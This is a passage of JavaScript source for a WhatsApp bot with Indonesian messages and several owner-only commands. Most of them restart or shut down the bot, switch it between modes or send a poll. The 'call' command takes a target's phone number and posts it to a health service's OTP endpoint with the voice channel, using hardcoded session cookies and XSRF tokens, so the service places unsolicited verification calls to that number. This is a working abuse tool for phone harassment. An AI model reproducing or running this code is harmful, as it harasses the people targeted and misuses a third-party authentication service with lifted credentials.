if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

//©from: dennis
case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
case 'shutdown':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis × mr_dark
case 'call':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

//©from: dennis
case 'public':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break

//©from: dennis
case 'private': case 'self':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break

//©from: dennis
case 'vote':
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {
"name": "@dcodedenpa",
"options": [{
"optionName": "option 1"
},{
"optionName": "option 2"
},{
"optionName": "option 3"
}],
"selectableOptionsCount": 3}}), { userJid: from })
semar.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
break
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}